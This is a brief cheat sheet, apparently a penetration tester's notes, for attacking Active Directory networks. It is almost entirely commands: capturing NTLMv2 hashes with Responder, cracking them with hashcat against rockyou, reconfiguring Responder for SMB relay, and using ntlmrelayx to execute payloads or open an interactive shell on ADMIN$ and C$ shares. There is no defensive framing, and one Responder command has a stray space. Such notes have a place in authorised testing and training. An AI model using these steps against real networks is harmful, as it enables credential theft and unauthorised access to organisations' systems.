## Active Directory Attack Guide.

#### Capture NTLMv2 Hashes with Responder
```
sudo responder -I eth0 - rdwv
```
#### Crack the Hash with Hashcat
```
hashcat -m 5600 hash rockyou.txt
```

#### Edit the Responder Config File for SMB Relay Attack
```
nano /etc/responder/responder.conf

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

#### Running Responder
```
sudo responder -I eth0 - rdwv
```
#### Starting NTLMrelayx part of Impacket Tools
```
ntlmrelayx.py -tf targets.txt -smb2support -i 
--help:
-i -- intercative
-e -- execute payload (test.exe)
-c -- run a command (whoami)
```

#### Netcat Listener on localhost
```
nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
Share
```


